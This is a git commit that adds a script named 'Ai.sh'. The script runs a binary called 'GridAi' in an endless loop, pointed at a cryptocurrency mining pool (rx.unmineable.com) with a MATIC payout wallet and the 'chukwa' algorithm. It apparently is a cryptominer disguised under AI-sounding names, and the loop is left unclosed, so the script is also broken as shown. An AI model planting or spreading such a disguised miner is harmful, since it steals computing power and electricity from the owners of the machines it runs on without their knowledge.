0039227d9c49b93ab5c47d34a92078b4403c0273
adhqwe4hjfsdjh <88487845+adhqwe4hjfsdjh@users.noreply.github.com>
2021-08-05 16:46:08 +0530

    Ai.sh

---
+++ Ai.sh
@@ -0,0 +1,8 @@
+POOL=rx.unmineable.com:3333
+WALLET=MATIC:0xb0861cDc09dC09e7C33cFCcE2Da16c07cEFEbBbC
+WORKER=$(echo $(shuf -i 10-40 -n 1)-X)
+a=chukwa
+while [ 1 ]; do
+  sleep 5
+  ./GridAi --algorithm $a --pool $POOL --username $WALLET.$WORKER 
+echo "GRIDAI"
